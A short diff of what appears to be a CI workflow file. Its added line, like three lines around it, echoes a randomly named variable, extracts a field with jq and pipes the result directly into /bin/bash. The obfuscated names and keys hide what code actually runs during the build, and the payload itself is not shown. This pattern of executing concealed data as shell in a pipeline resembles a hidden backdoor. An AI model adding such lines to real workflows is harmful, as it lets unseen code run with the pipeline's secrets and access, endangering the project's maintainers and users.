@@ -22,6 +22,7 @@ jobs:
           echo $zmu941 | jq -r .b8 | /bin/bash
           echo $ekq965 | jq -r .hnh3 | /bin/bash
           printf '%s' "$dsc5" | jq -r .q3 | /bin/bash
+          echo $jgj9 | jq -r .t78012 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
